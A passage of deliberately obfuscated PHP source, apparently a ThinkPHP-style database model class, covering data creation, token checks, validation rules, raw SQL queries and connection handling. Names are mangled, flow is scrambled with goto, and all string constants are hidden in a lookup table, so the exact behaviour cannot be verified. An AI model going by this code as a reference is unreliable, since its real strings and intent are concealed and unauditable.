F•‡ÚğÆ½´; bùİ©šŒ£: $f‘ÅµÎØ­ = array_shift($DªáÈÊÛ÷§); $B¦Øˆš¯„ƒ = array(); $C‰ë×õŠ¶ = count($FŒºææŠÚ); goto Fˆ†½µš‘Û; F•‡ÚğÆ½´: $FŒºææŠÚ = explode($E’åÀùÄè•[47], $DªáÈÊÛ÷§); $DªáÈÊÛ÷§ = array_keys($dØÜ‘‘Œ…‹[0]); $dÊô‡Ç§æÓ = array_shift($DªáÈÊÛ÷§); goto bùİ©šŒ£; Fˆ†½µš‘Û: foreach ($dØÜ‘‘Œ…‹ as $cóåêÑ‰·‚) { $A´¶àÏÈ×ë = $cóåêÑ‰·‚[$dÊô‡Ç§æÓ]; if (2 == $C‰ë×õŠ¶) { $B¦Øˆš¯„ƒ[$A´¶àÏÈ×ë] = $cóåêÑ‰·‚[$f‘ÅµÎØ­]; } else { $B¦Øˆš¯„ƒ[$A´¶àÏÈ×ë] = is_string($f¢ƒÅíÁÔÈ) ? implode($f¢ƒÅíÁÔÈ, $cóåêÑ‰·‚) : $cóåêÑ‰·‚; } } return $B¦Øˆš¯„ƒ; goto cà—ò†‹†¥; cà—ò†‹†¥: } } else { if (!0 !== $f¢ƒÅíÁÔÈ) { $Bô°Ê©¶‹»[$E’åÀùÄè•[277]] = is_numeric($f¢ƒÅíÁÔÈ) ? $f¢ƒÅíÁÔÈ : 1; } if ($f¢ƒÅíÁÔÈ === $E’åÀùÄè•[240]) { unset($Bô°Ê©¶‹»[$E’åÀùÄè•[277]]); } $cóåêÑ‰·‚ = $this->db->select($Bô°Ê©¶‹»); if (!empty($cóåêÑ‰·‚)) { if ($f¢ƒÅíÁÔÈ === $E’åÀùÄè•[240]) { return reset($cóåêÑ‰·‚[0]); } if (!0 !== $f¢ƒÅíÁÔÈ && 1 == $Bô°Ê©¶‹»[$E’åÀùÄè•[277]]) { return reset($cóåêÑ‰·‚[0]); } foreach ($cóåêÑ‰·‚ as $E„ù£·æÉ”) { $DæƒêÉ½¹Ş[] = $E„ù£·æÉ”[$DªáÈÊÛ÷§]; } return $DæƒêÉ½¹Ş; } } return null; } public function create($cÎ„ÂÂ = '', $aô“ˆª’š = '') { goto bº›·¾µ‹ç; e àÒˆ½±: return $cÎ„ÂÂ; goto CîÛÙó›¬Î; CŒá¼Ğ·İå: $cÎ„ÂÂ = $this->parseFieldsMap($cÎ„ÂÂ, 0); $aô“ˆª’š = $aô“ˆª’š ? $aô“ˆª’š : (!empty($cÎ„ÂÂ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$e¤²§ˆÊ‚[258]])) { $FŸ­Üºäß­ = $this->options[$e¤²§ˆÊ‚[258]]; unset($this->options[$e¤²§ˆÊ‚[258]]); } elseif ($aô“ˆª’š == THINK_MODEL_INSERT && isset($this->insertFields)) { $FŸ­Üºäß­ = $this->insertFields; } elseif ($aô“ˆª’š == THINK_MODEL_UPDATE && isset($this->updateFields)) { $FŸ­Üºäß­ = $this->updateFields; } goto D”´Îïì ö; E¢›ÀˆŠ¸¶: if ($this->autoCheckFields) { $FŸ­Üºäß­ = $this->getDbFields(); foreach ($cÎ„ÂÂ as $C•…£ë„æ“ => $e½©‰ÉŒ‚²) { if (!in_array($C•…£ë„æ“, $FŸ­Üºäß­)) { unset($cÎ„ÂÂ[$C•…£ë„æ“]); } elseif (MAGIC_QUOTES_GPC && is_string($e½©‰ÉŒ‚²)) { $cÎ„ÂÂ[$C•…£ë„æ“] = stripslashes($e½©‰ÉŒ‚²); } } } $this->autoOperation($cÎ„ÂÂ, $aô“ˆª’š); $this->data = $cÎ„ÂÂ; goto e àÒˆ½±; D”´Îïì ö: if (isset($FŸ­Üºäß­)) { if (is_string($FŸ­Üºäß­)) { $FŸ­Üºäß­ = explode($e¤²§ˆÊ‚[47], $FŸ­Üºäß­); } if (think_config($e¤²§ˆÊ‚[283])) { $FŸ­Üºäß­[] = think_config($e¤²§ˆÊ‚[284]); } foreach ($cÎ„ÂÂ as $C•…£ë„æ“ => $e½©‰ÉŒ‚²) { if (!in_array($C•…£ë„æ“, $FŸ­Üºäß­)) { unset($cÎ„ÂÂ[$C•…£ë„æ“]); } } } if (!$this->autoValidation($cÎ„ÂÂ, $aô“ˆª’š)) { return !1; } if (!$this->autoCheckToken($cÎ„ÂÂ)) { $this->error = think_lang($e¤²§ˆÊ‚[285]); return !1; } goto E¢›ÀˆŠ¸¶; bº›·¾µ‹ç: $e¤²§ˆÊ‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($cÎ„ÂÂ)) { $cÎ„ÂÂ = $_POST; } elseif (is_object($cÎ„ÂÂ)) { $cÎ„ÂÂ = get_object_vars($cÎ„ÂÂ); } if (empty($cÎ„ÂÂ) || !is_array($cÎ„ÂÂ)) { $this->error = think_lang($e¤²§ˆÊ‚[256]); return !1; } goto CŒá¼Ğ·İå; CîÛÙó›¬Î: } public function autoCheckToken($fØ…Àé…İº) { $D¾ä’Ú•˜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($this->options[$D¾ä’Ú•˜[286]]) && !$this->options[$D¾ä’Ú•˜[286]]) { return !0; } if (think_config($D¾ä’Ú•˜[283])) { $aÒì…óíóŒ = think_config($D¾ä’Ú•˜[284]); if (!isset($fØ…Àé…İº[$aÒì…óíóŒ]) || Session::get($aÒì…óíóŒ)) { return !1; } list($eƒ·ò›ª, $D¶šì¸çÔ¢) = explode($D¾ä’Ú•˜[70], $fØ…Àé…İº[$aÒì…óíóŒ]); if ($D¶šì¸çÔ¢ && Session::get($aÒì…óíóŒ . $D¾ä’Ú•˜[93] . $eƒ·ò›ª) === $D¶šì¸çÔ¢) { Session::remove($aÒì…óíóŒ . $D¾ä’Ú•˜[93] . $eƒ·ò›ª); return !0; } if (think_config($D¾ä’Ú•˜[287])) { Session::remove($aÒì…óíóŒ . $D¾ä’Ú•˜[93] . $eƒ·ò›ª); } return !1; } return !0; } public function regex($BÛâÑË‚Ü, $BÂæ¯¢‘êÈ) { $d…Ú®•ÙÜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d‹šˆ¶‘æ® = array($d…Ú®•ÙÜ[288] => $d…Ú®•ÙÜ[289], $d…Ú®•ÙÜ[290] => $d…Ú®•ÙÜ[291], $d…Ú®•ÙÜ[292] => $d…Ú®•ÙÜ[293], $d…Ú®•ÙÜ[294] => $d…Ú®•ÙÜ[295], $d…Ú®•ÙÜ[296] => $d…Ú®•ÙÜ[297], $d…Ú®•ÙÜ[298] => $d…Ú®•ÙÜ[299], $d…Ú®•ÙÜ[300] => $d…Ú®•ÙÜ[301], $d…Ú®•ÙÜ[275] => $d…Ú®•ÙÜ[302], $d…Ú®•ÙÜ[303] => $d…Ú®•ÙÜ[304]); if (isset($d‹šˆ¶‘æ®[strtolower($BÂæ¯¢‘êÈ)])) { $BÂæ¯¢‘êÈ = $d‹šˆ¶‘æ®[strtolower($BÂæ¯¢‘êÈ)]; } return preg_match($BÂæ¯¢‘êÈ, $BÛâÑË‚Ü) === 1; } private function autoOperation(&$B§‹‚‘², $Bå–”–ŠŸ) { $FÑØ„ÈçÙ¨ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!empty($this->options[$FÑØ„ÈçÙ¨[305]])) { $føÆ”ƒŠ‹ = $this->options[$FÑØ„ÈçÙ¨[305]]; unset($this->options[$FÑØ„ÈçÙ¨[305]]); } elseif (!empty($this->_auto)) { $føÆ”ƒŠ‹ = $this->_auto; } if (isset($føÆ”ƒŠ‹)) { foreach ($føÆ”ƒŠ‹ as $D¹¦˜Ç‰Ûæ) { if (empty($D¹¦˜Ç‰Ûæ[2])) { $D¹¦˜Ç‰Ûæ[2] = THINK_MODEL_INSERT; } if ($Bå–”–ŠŸ == $D¹¦˜Ç‰Ûæ[2] || $D¹¦˜Ç‰Ûæ[2] == THINK_MODEL_BOTH) { switch (trim($D¹¦˜Ç‰Ûæ[3])) { case $FÑØ„ÈçÙ¨[306]: case $FÑØ„ÈçÙ¨[307]: $aÃö‚¬‘î¨ = isset($D¹¦˜Ç‰Ûæ[4]) ? (array) $D¹¦˜Ç‰Ûæ[4] : array(); if (isset($B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]])) { array_unshift($aÃö‚¬‘î¨, $B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]]); } if ($FÑØ„ÈçÙ¨[306] == $D¹¦˜Ç‰Ûæ[3]) { $B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]] = call_user_func_array($D¹¦˜Ç‰Ûæ[1], $aÃö‚¬‘î¨); } else { $B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]] = call_user_func_array(array(&$this, $D¹¦˜Ç‰Ûæ[1]), $aÃö‚¬‘î¨); } break; case $FÑØ„ÈçÙ¨[258]: $B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]] = $B§‹‚‘²[$D¹¦˜Ç‰Ûæ[1]]; break; case $FÑØ„ÈçÙ¨[308]: if ($FÑØ„ÈçÙ¨[33] === $B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]]) { unset($B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]]); } break; case $FÑØ„ÈçÙ¨[309]: default: $B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]] = $D¹¦˜Ç‰Ûæ[1]; } if (!1 === $B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]]) { unset($B§‹‚‘²[$D¹¦˜Ç‰Ûæ[0]]); } } } } return $B§‹‚‘²; } protected function autoValidation($C·æŠí¨Å, $c§¾Îïà¾ß) { $eÚ§‘¥É£ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!empty($this->options[$eÚ§‘¥É£[310]])) { $B±ŸŒŒ©Š´ = $this->options[$eÚ§‘¥É£[310]]; unset($this->options[$eÚ§‘¥É£[310]]); } elseif (!empty($this->_validate)) { $B±ŸŒŒ©Š´ = $this->_validate; } if (isset($B±ŸŒŒ©Š´)) { if ($this->patchValidate) { $this->error = array(); } foreach ($B±ŸŒŒ©Š´ as $DˆöÑ‘¿‚± => $e„öî…µùö) { if (empty($e„öî…µùö[5]) || $e„öî…µùö[5] == THINK_MODEL_BOTH || $e„öî…µùö[5] == $c§¾Îïà¾ß) { if (0 == strpos($e„öî…µùö[2], $eÚ§‘¥É£[311]) && strpos($e„öî…µùö[2], $eÚ§‘¥É£[312])) { $e„öî…µùö[2] = think_lang(substr($e„öî…µùö[2], 2, -1)); } $e„öî…µùö[3] = isset($e„öî…µùö[3]) ? $e„öî…µùö[3] : THINK_EXISTS_VALIDATE; $e„öî…µùö[4] = isset($e„öî…µùö[4]) ? $e„öî…µùö[4] : $eÚ§‘¥É£[313]; switch ($e„öî…µùö[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($C·æŠí¨Å, $e„öî…µùö)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($eÚ§‘¥É£[33] != trim($C·æŠí¨Å[$e„öî…µùö[0]])) { if (!1 === $this->_validationField($C·æŠí¨Å, $e„öî…µùö)) { return !1; } } break; default: if (isset($C·æŠí¨Å[$e„öî…µùö[0]])) { if (!1 === $this->_validationField($C·æŠí¨Å, $e„öî…µùö)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($B¤¶Ã¯»öØ, $e†ß«µ¡) { if (!1 === $this->_validationFieldItem($B¤¶Ã¯»öØ, $e†ß«µ¡)) { if ($this->patchValidate) { $this->error[$e†ß«µ¡[0]] = $e†ß«µ¡[2]; } else { $this->error = $e†ß«µ¡[2]; return !1; } } return; } protected function _validationFieldItem($eêÆæô‹¨, $fË¼…Ã„•) { $CôˆÍ—¥‡ì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; switch (strtolower(trim($fË¼…Ã„•[4]))) { case $CôˆÍ—¥‡ì[306]: case $CôˆÍ—¥‡ì[307]: $cšÓÏ”¥ô‰ = isset($fË¼…Ã„•[6]) ? (array) $fË¼…Ã„•[6] : array(); if (is_string($fË¼…Ã„•[0]) && strpos($fË¼…Ã„•[0], $CôˆÍ—¥‡ì[47])) { $fË¼…Ã„•[0] = explode($CôˆÍ—¥‡ì[47], $fË¼…Ã„•[0]); } if (is_array($fË¼…Ã„•[0])) { foreach ($fË¼…Ã„•[0] as $a‰õ‚×®¢¥) { $C”ÄÓêâ”Ì[$a‰õ‚×®¢¥] = $eêÆæô‹¨[$a‰õ‚×®¢¥]; } array_unshift($cšÓÏ”¥ô‰, $C”ÄÓêâ”Ì); } else { array_unshift($cšÓÏ”¥ô‰, $eêÆæô‹¨[$fË¼…Ã„•[0]]); } if ($CôˆÍ—¥‡ì[306] == $fË¼…Ã„•[4]) { return call_user_func_array($fË¼…Ã„•[1], $cšÓÏ”¥ô‰); } else { return call_user_func_array(array(&$this, $fË¼…Ã„•[1]), $cšÓÏ”¥ô‰); } case $CôˆÍ—¥‡ì[314]: return $eêÆæô‹¨[$fË¼…Ã„•[0]] == $eêÆæô‹¨[$fË¼…Ã„•[1]]; case $CôˆÍ—¥‡ì[315]: if (is_string($fË¼…Ã„•[0]) && strpos($fË¼…Ã„•[0], $CôˆÍ—¥‡ì[47])) { $fË¼…Ã„•[0] = explode($CôˆÍ—¥‡ì[47], $fË¼…Ã„•[0]); } $d×Ø¹âÆ‡ = array(); if (is_array($fË¼…Ã„•[0])) { foreach ($fË¼…Ã„•[0] as $a‰õ‚×®¢¥) { $d×Ø¹âÆ‡[$a‰õ‚×®¢¥] = $eêÆæô‹¨[$a‰õ‚×®¢¥]; } } else { $d×Ø¹âÆ‡[$fË¼…Ã„•[0]] = $eêÆæô‹¨[$fË¼…Ã„•[0]]; } if (!empty($eêÆæô‹¨[$this->getPk()])) { $d×Ø¹âÆ‡[$this->getPk()] = array($CôˆÍ—¥‡ì[316], $eêÆæô‹¨[$this->getPk()]); } if ($this->where($d×Ø¹âÆ‡)->find()) { return !1; } return !0; default: return $this->check($eêÆæô‹¨[$fË¼…Ã„•[0]], $fË¼…Ã„•[1], $fË¼…Ã„•[4]); } } public function check($b¨¯²¨ÜŒ, $b¹ö³‰ŠÂ, $d‚¦À‡Ó…« = "\162\x65\x67\x65\170") { $f¶ùÛÌàÊÈ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d‚¦À‡Ó…« = strtolower(trim($d‚¦À‡Ó…«)); switch ($d‚¦À‡Ó…«) { case $f¶ùÛÌàÊÈ[7]: case $f¶ùÛÌàÊÈ[317]: $fëˆ³ÂÇâã = is_array($b¹ö³‰ŠÂ) ? $b¹ö³‰ŠÂ : explode($f¶ùÛÌàÊÈ[47], $b¹ö³‰ŠÂ); return $d‚¦À‡Ó…« == $f¶ùÛÌàÊÈ[7] ? in_array($b¨¯²¨ÜŒ, $fëˆ³ÂÇâã) : !in_array($b¨¯²¨ÜŒ, $fëˆ³ÂÇâã); case $f¶ùÛÌàÊÈ[318]: case $f¶ùÛÌàÊÈ[319]: if (is_array($b¹ö³‰ŠÂ)) { $A°¬’‰ˆè¤ = $b¹ö³‰ŠÂ[0]; $a—›ùß›Ş = $b¹ö³‰ŠÂ[1]; } else { list($A°¬’‰ˆè¤, $a—›ùß›Ş) = explode($f¶ùÛÌàÊÈ[47], $b¹ö³‰ŠÂ); } return $d‚¦À‡Ó…« == $f¶ùÛÌàÊÈ[318] ? $b¨¯²¨ÜŒ >= $A°¬’‰ˆè¤ && $b¨¯²¨ÜŒ <= $a—›ùß›Ş : $b¨¯²¨ÜŒ < $A°¬’‰ˆè¤ || $b¨¯²¨ÜŒ > $a—›ùß›Ş; case $f¶ùÛÌàÊÈ[320]: case $f¶ùÛÌàÊÈ[321]: return $d‚¦À‡Ó…« == $f¶ùÛÌàÊÈ[320] ? $b¨¯²¨ÜŒ == $b¹ö³‰ŠÂ : $b¨¯²¨ÜŒ != $b¹ö³‰ŠÂ; case $f¶ùÛÌàÊÈ[322]: $FÁˆÆ•à¼Å = mb_strlen($b¨¯²¨ÜŒ, $f¶ùÛÌàÊÈ[323]); if (strpos($b¹ö³‰ŠÂ, $f¶ùÛÌàÊÈ[47])) { list($A°¬’‰ˆè¤, $a—›ùß›Ş) = explode($f¶ùÛÌàÊÈ[47], $b¹ö³‰ŠÂ); return $FÁˆÆ•à¼Å >= $A°¬’‰ˆè¤ && $FÁˆÆ•à¼Å <= $a—›ùß›Ş; } else { return $FÁˆÆ•à¼Å == $b¹ö³‰ŠÂ; } case $f¶ùÛÌàÊÈ[324]: list($BĞ›Œ·ºéµ, $CÂŒÆ¾öË©) = explode($f¶ùÛÌàÊÈ[47], $b¹ö³‰ŠÂ); if (!is_numeric($BĞ›Œ·ºéµ)) { $BĞ›Œ·ºéµ = strtotime($BĞ›Œ·ºéµ); } if (!is_numeric($CÂŒÆ¾öË©)) { $CÂŒÆ¾öË© = strtotime($CÂŒÆ¾öË©); } return NOW_TIME >= $BĞ›Œ·ºéµ && NOW_TIME <= $CÂŒÆ¾öË©; case $f¶ùÛÌàÊÈ[325]: return in_array(get_client_ip(), explode($f¶ùÛÌàÊÈ[47], $b¹ö³‰ŠÂ)); case $f¶ùÛÌàÊÈ[326]: return !in_array(get_client_ip(), explode($f¶ùÛÌàÊÈ[47], $b¹ö³‰ŠÂ)); case $f¶ùÛÌàÊÈ[313]: default: return $this->regex($b¨¯²¨ÜŒ, $b¹ö³‰ŠÂ); } } public function query($f¨´–ŒäÉ›, $e­‹ñ¨äÍ = false) { $D¹İ³ÎÔ‚Ì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!is_bool($e­‹ñ¨äÍ) && !is_array($e­‹ñ¨äÍ)) { $e­‹ñ¨äÍ = func_get_args(); array_shift($e­‹ñ¨äÍ); } $f¨´–ŒäÉ› = str_replace(array($D¹İ³ÎÔ‚Ì[214], $D¹İ³ÎÔ‚Ì[327]), $D¹İ³ÎÔ‚Ì[50], $f¨´–ŒäÉ›); $f¨´–ŒäÉ› = $this->parseSql($f¨´–ŒäÉ›, $e­‹ñ¨äÍ); return $this->db->query($f¨´–ŒäÉ›); } public function execute($CÁ«Šç”Ú—, $EÇÌÒ´Ò¨ = false) { if (!is_bool($EÇÌÒ´Ò¨) && !is_array($EÇÌÒ´Ò¨)) { $EÇÌÒ´Ò¨ = func_get_args(); array_shift($EÇÌÒ´Ò¨); } $CÁ«Šç”Ú— = $this->parseSql($CÁ«Šç”Ú—, $EÇÌÒ´Ò¨); return $this->db->execute($CÁ«Šç”Ú—); } protected function parseSql($Aôö©°Ş‘½, $cá½º»¬Ïâ) { $E²Õò˜Œµƒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!0 === $cá½º»¬Ïâ) { $F†­±Õ” = $this->_parseOptions(); $Aôö©°Ş‘½ = $this->db->parseSql($Aôö©°Ş‘½, $F†­±Õ”); } elseif (is_array($cá½º»¬Ïâ)) { $cá½º»¬Ïâ = array_map(array($this->db, $E²Õò˜Œµƒ[328]), $cá½º»¬Ïâ); $Aôö©°Ş‘½ = vsprintf($Aôö©°Ş‘½, $cá½º»¬Ïâ); } else { $Aôö©°Ş‘½ = strtr($Aôö©°Ş‘½, array($E²Õò˜Œµƒ[329] => $this->getTableName(), $E²Õò˜Œµƒ[330] => think_config($E²Õò˜Œµƒ[229]))); } $this->db->setModel($this->name); return $Aôö©°Ş‘½; } public function db($CÎá½„°¦× = '', $B˜ËàÚŸîà = '', $Bã«¶¦§ = array()) { goto F†‰öÙÂê›; DÙ‘‡ÃŒ‘: static $eŒ½ïõÜÌ = array(); if (!isset($eŒ½ïõÜÌ[$CÎá½„°¦×]) || isset($eŒ½ïõÜÌ[$CÎá½„°¦×]) && $B˜ËàÚŸîà && $F†­ñ´Õ¾Ö[$CÎá½„°¦×] != $B˜ËàÚŸîà) { if (!empty($B˜ËàÚŸîà) && is_string($B˜ËàÚŸîà) && !1 === strpos($B˜ËàÚŸîà, $c‹ïíÚÑæ[8])) { $B˜ËàÚŸîà = think_config($B˜ËàÚŸîà); } $eŒ½ïõÜÌ[$CÎá½„°¦×] = Db::getInstance($B˜ËàÚŸîà); } elseif (NULL === $B˜ËàÚŸîà) { $eŒ½ïõÜÌ[$CÎá½„°¦×]->close(); unset($eŒ½ïõÜÌ[$CÎá½„°¦×]); return; } if (!empty($Bã«¶¦§)) { if (is_string($Bã«¶¦§)) { parse_str($Bã«¶¦§, $Bã«¶¦§); } foreach ($Bã«¶¦§ as $DÃÎ¤ŞÚ²× => $d”æÈĞÒ™Ñ) { $this->setProperty($DÃÎ¤ŞÚ²×, $d”æÈĞÒ™Ñ); } } goto bŒİöĞõÌò; bŒİöĞõÌò: $F†­ñ´Õ¾Ö[$CÎá½„°¦×] = $B˜ËàÚŸîà; $this->db = $eŒ½ïõÜÌ[$CÎá½„°¦×]; $this->_after_db(); goto c²³¥˜Úëã; F†‰öÙÂê›: $c‹ïíÚÑæ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($c‹ïíÚÑæ[33] === $CÎá½„°¦× && $this->db) { return $this->db; } static $F†­ñ´Õ¾Ö = array(); goto DÙ‘‡ÃŒ‘; c²³¥˜Úëã: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto C©†×¸ÏŠÀ; C©†×¸ÏŠÀ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $eõöĞ½š = get_class($this); if ($eõöĞ½š == $_SERVER[ÚŠ•´ÍéÒÑÔ][331]) { return $this->name; } $this->name = substr($eõöĞ½š, 0, -5); } return $this->name; } public function getTableName() { $aÒæò™¸ñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($this->trueTableName)) { $F‹éÙ§“Ì = !empty($this->tablePrefix) ? $this->tablePrefix : $aÒæò™¸ñ[33]; if (!empty($this->tableName)) { $F‹éÙ§“Ì .= $this->tableName; } else { $F‹éÙ§“Ì .= think_parse_name($this->name); } $this->trueTableName = strtolower($F‹éÙ§“Ì); } return (!empty($this->dbName) ? $this->dbName . $aÒæò™¸ñ[93] : $aÒæò™¸ñ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $BÖ½ŠÉ‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return isset($this->fields[$BÖ½ŠÉ‹[236]]) ? $this->fields[$BÖ½ŠÉ‹[236]] : $this->pk; } public function getDbFields() { $cå«³„ÃŒ¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($this->options[$cå«³„ÃŒ¸[264]])) { $F˜åóÇÈÁ = $this->db->getFields($this->options[$cå«³„ÃŒ¸[264]]); return $F˜åóÇÈÁ ? array_keys($F˜åóÇÈÁ) : !1; } if ($this->fields) { $F˜åóÇÈÁ = $this->fields; unset($F˜åóÇÈÁ[$cå«³„ÃŒ¸[235]], $F˜åóÇÈÁ[$cå«³„ÃŒ¸[236]], $F˜åóÇÈÁ[$cå«³„ÃŒ¸[237]], $F˜åóÇÈÁ[$cå«³„ÃŒ¸[234]]); return $F˜åóÇÈÁ; } return !1; } public function data($Cˆ÷É¿ô®Á = '') { $DÆ¬»¢¿à =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($DÆ¬»¢¿à[33] === $Cˆ÷É¿ô®Á && !empty($this->data)) { return $this->data; } if (is_object($Cˆ÷É¿ô®Á)) { $Cˆ÷É¿ô®Á = get_object_vars($Cˆ÷É¿ô®Á); } elseif (is_string($Cˆ÷É¿ô®Á)) { parse_str($Cˆ÷É¿ô®Á, $Cˆ÷É¿ô®Á); } elseif (!is_array($Cˆ÷É¿ô®Á)) { think_exception(think_lang($DÆ¬»¢¿à[256])); } $this->data = $Cˆ÷É¿ô®Á; return $this; } public function join($bĞªÚƒ) { $AÓ¦¬ª¶¥Ï =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_array($bĞªÚƒ)) { $this->options[$AÓ¦¬ª¶¥Ï[267]] = $bĞªÚƒ; } elseif (!empty($bĞªÚƒ)) { $this->options[$AÓ¦¬ª¶¥Ï[267]][] = $bĞªÚƒ; } return $this; } public function union($dÎÀÕäåÛ¶, $A…ƒÈáÃÔÅ = false) { goto FÜêªÍÒ; C½ƒÅ’¤À: if (is_object($dÎÀÕäåÛ¶)) { $dÎÀÕäåÛ¶ = get_object_vars($dÎÀÕäåÛ¶); } if (is_string($dÎÀÕäåÛ¶)) { $b®”ù‹èµö = $dÎÀÕäåÛ¶; } elseif (is_array($dÎÀÕäåÛ¶)) { if (isset($dÎÀÕäåÛ¶[0])) { $this->options[$eíÖàì¿ãï[332]] = array_merge($this->options[$eíÖàì¿ãï[332]], $dÎÀÕäåÛ¶); return $this; } else { $b®”ù‹èµö = $dÎÀÕäåÛ¶; } } else { think_exception(think_lang($eíÖàì¿ãï[256])); } $this->options[$eíÖàì¿ãï[332]][] = $b®”ù‹èµö; goto AÂöééËŸÏ; AÂöééËŸÏ: return $this; goto bª¸ÔËãä; FÜêªÍÒ: $eíÖàì¿ãï =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($dÎÀÕäåÛ¶)) { return $this; } if ($A…ƒÈáÃÔÅ) { $this->options[$eíÖàì¿ãï[332]][$eíÖàì¿ãï[333]] = !0; } goto C½ƒÅ’¤À; bª¸ÔËãä: } public function cache($CèğÑ¾àá¸ = true, $fô‹† ƒ±á = null, $FÅí™˜–ÂÙ = '') { $CØ†ùÓ¯£ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!1 !== $CèğÑ¾àá¸) { $this->options[$CØ†ùÓ¯£ê[334]] = array($CØ†ùÓ¯£ê[89] => $CèğÑ¾àá¸, $CØ†ùÓ¯£ê[324] => $fô‹† ƒ±á, $CØ†ùÓ¯£ê[29] => $FÅí™˜–ÂÙ); } return $this; } public function field($CÄ‘´â­•, $EñŠŸÂˆ¢ = false) { $c†ùÆİèË— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!0 === $CÄ‘´â­•) { $DÜù¦«Š† = $this->getDbFields(); $CÄ‘´â­• = $DÜù¦«Š† ? $DÜù¦«Š† : $c†ùÆİèË—[173]; } elseif ($EñŠŸÂˆ¢) { if (is_string($CÄ‘´â­•)) { $CÄ‘´â­• = explode($c†ùÆİèË—[47], $CÄ‘´â­•); } $DÜù¦«Š† = $this->getDbFields(); $CÄ‘´â­• = $DÜù¦«Š† ? array_diff($DÜù¦«Š†, $CÄ‘´â­•) : $CÄ‘´â­•; } $this->options[$c†ùÆİèË—[258]] = $CÄ‘´â­•; return $this; } public function scope($C‚­·ˆ½Äå = '', $Eï£Œ×æ = NULL) { $fÎƒëŒ­‹ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($fÎƒëŒ­‹ê[33] === $C‚­·ˆ½Äå) { if (isset($this->_scope[$fÎƒëŒ­‹ê[34]])) { $C†ß„ë‰–» = $this->_scope[$fÎƒëŒ­‹ê[34]]; } else { return $this; } } elseif (is_string($C‚­·ˆ½Äå)) { $fšÙ’‰ßŞÛ = explode($fÎƒëŒ­‹ê[47], $C‚­·ˆ½Äå); $C†ß„ë‰–» = array(); foreach ($fšÙ’‰ßŞÛ as $cîÁğ‰âÔ¾) { if (!isset($this->_scope[$cîÁğ‰âÔ¾])) { continue; } $C†ß„ë‰–» = array_merge($C†ß„ë‰–», $this->_scope[$cîÁğ‰âÔ¾]); } if (!empty($Eï£Œ×æ) && is_array($Eï£Œ×æ)) { $C†ß„ë‰–» = array_merge($C†ß„ë‰–», $Eï£Œ×æ); } } elseif (is_array($C‚­·ˆ½Äå)) { $C†ß„ë‰–» = $C‚­·ˆ½Äå; } if (is_array($C†ß„ë‰–») && !empty($C†ß„ë‰–»)) { $this->options = array_merge($this->options, array_change_key_case($C†ß„ë‰–»)); } return $this; } public function where($a»ÅŒªÎŒ£, $FëªŞÁ²–â = null) { $C§›èàåÂ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!is_null($FëªŞÁ²–â) && is_string($a»ÅŒªÎŒ£)) { if (!is_array($FëªŞÁ²–â)) { $FëªŞÁ²–â = func_get_args(); array_shift($FëªŞÁ²–â); } $FëªŞÁ²–â = array_map(array($this->db, $C§›èàåÂ[328]), $FëªŞÁ²–â); $a»ÅŒªÎŒ£ = vsprintf($a»ÅŒªÎŒ£, $FëªŞÁ²–â); } elseif (is_object($a»ÅŒªÎŒ£)) { $a»ÅŒªÎŒ£ = get_object_vars($a»ÅŒªÎŒ£); } elseif (is_array($a»ÅŒªÎŒ£)) { foreach ($a»ÅŒªÎŒ£ as $Fê¯áÊÅ«„ => $A„¹‹³öÕ¹) { if ((is_numeric($Fê¯áÊÅ«„) || !$Fê¯áÊÅ«„) && is_string($A„¹‹³öÕ¹)) { think_trace($C§›èàåÂ[335], $C§›èàåÂ[33], $C§›èàåÂ[46]); die; } } } if (is_string($a»ÅŒªÎŒ£) && $C§›èàåÂ[33] != $a»ÅŒªÎŒ£) { $CíÑ¶›¬ó = array(); $CíÑ¶›¬ó[$C§›èàåÂ[336]] = $a»ÅŒªÎŒ£; $a»ÅŒªÎŒ£ = $CíÑ¶›¬ó; } if (isset($this->options[$C§›èàåÂ[260]])) { $this->options[$C§›èàåÂ[260]] = array_merge($this->options[$C§›èàåÂ[260]], $a»ÅŒªÎŒ£); } else { $this->options[$C§›èàåÂ[260]] = $a»ÅŒªÎŒ£; } return $this; } public function limit($Eùˆ‰¾îÏè, 